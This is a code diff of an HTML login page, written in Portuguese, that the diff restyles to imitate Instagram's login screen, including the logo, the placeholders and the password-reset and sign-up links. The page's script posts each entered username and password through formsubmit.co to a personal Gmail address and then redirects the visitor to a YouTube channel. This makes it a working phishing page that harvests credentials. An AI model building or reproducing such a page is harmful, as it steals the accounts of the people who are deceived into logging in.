@@ -3,12 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Login </title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Segoe+Script&display=swap" rel="stylesheet" />
+  <title>Login Instagram - Teste</title>
   <style>
     body {
-      background-color: #fafafa;
-      font-family: 'Roboto', sans-serif;
+      background-color: #fff;
+      font-family: Arial, sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -17,53 +16,53 @@
     }
 
     .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 48px;
       margin-bottom: 30px;
-      font-weight: bold;
-      font-size: 32px;
-      color: #6a1b9a; /* roxo escuro */
-      letter-spacing: 2px;
-      font-family: 'Segoe Script', cursive;
-      text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
     }
 
     form {
       background: #fff;
       border: 1px solid #dbdbdb;
       padding: 40px 40px 30px;
-      border-radius: 6px;
+      border-radius: 1px;
       width: 100%;
       max-width: 320px;
       box-sizing: border-box;
       display: flex;
       flex-direction: column;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.04);
     }
 
     input {
-      margin-bottom: 10px;
+      margin-bottom: 8px;
       padding: 12px 10px;
       font-size: 14px;
       border: 1px solid #dbdbdb;
-      border-radius: 4px;
+      border-radius: 3px;
       background: #fafafa;
       outline: none;
-      font-family: 'Segoe Script', cursive;
-      color: #5e35b1; /* tom roxo */
-      letter-spacing: 1.5px;
-    }
-
-    input::placeholder {
-      font-family: 'Segoe Script', cursive;
-      color: #9c27b0;
-      opacity: 0.8;
-      letter-spacing: 1.2px;
     }
 
     input:focus {
       border-color: #a8a8a8;
       background: #fff;
-      color: #4527a0;
-      font-weight: bold;
+    }
+
+    .links {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12px;
+      margin: 8px 0 16px;
+    }
+
+    .links a {
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    .links a:hover {
+      text-decoration: underline;
     }
 
     button {
@@ -75,10 +74,7 @@
       font-size: 14px;
       border-radius: 4px;
       cursor: pointer;
-      margin-top: 10px;
-      transition: background-color 0.3s ease;
-      font-family: 'Roboto', sans-serif;
-      letter-spacing: 1px;
+      margin-top: 5px;
     }
 
     button:hover {
@@ -87,15 +83,13 @@
 
     .footer {
       margin-top: 20px;
-      font-size: 12px;
-      color: #999;
-      text-align: center;
-      max-width: 320px;
+      font-size: 13px;
     }
 
     .footer a {
       color: #00376b;
       text-decoration: none;
+      font-weight: bold;
     }
 
     .footer a:hover {
@@ -104,20 +98,22 @@
   </style>
 </head>
 <body>
-  <div class="logo">Entre</div>
+  <div class="logo">Instagram</div>
 
   <form id="loginForm">
-    <input type="text" name="usuarioteste" placeholder="usuário" required />
-    <input type="password" name="respostateste" placeholder="senha" required />
+    <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required />
+    <input type="password" name="password" placeholder="Senha" required />
 
-    <input type="hidden" name="_captcha" value="false" />
-    <input type="hidden" name="_next" value="https://www.youtube.com/@NATTO_BEATS" />
+    <div class="links">
+      <div></div>
+      <a href="#">Esqueceu a senha?</a>
+    </div>
 
-    <button type="submit">Enviar</button>
+    <button type="submit">Entrar</button>
   </form>
 
-  <div class="footer"> 
-    <br>
+  <div class="footer">
+    Não tem uma conta? <a href="#">Cadastre-se</a>
   </div>
 
   <script>
@@ -128,23 +124,20 @@
 
       const formData = new FormData(form);
 
-fetch('https://formsubmit.co/ajax/fabiofrancisco655@gmail.com', {
-  method: 'POST',
-  body: new URLSearchParams(formData),
-  headers: {
-    'Accept': 'application/json',
-    'Content-Type': 'application/x-www-form-urlencoded'
-  }
-})
+      fetch('https://formsubmit.co/ajax/fabiofrancisco655@gmail.com', {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      })
       .then(response => {
         if (response.ok) {
           window.location.href = 'https://www.youtube.com/@NATTO_BEATS';
         } else {
-          alert('Erro ao enviar. Tente novamente.');
+          alert('Erro ao enviar o formulário.');
         }
       })
       .catch(() => {
-        alert('Erro de conexão. Verifique sua internet.');
+        alert('Erro na conexão.');
       });
     });
   </script>
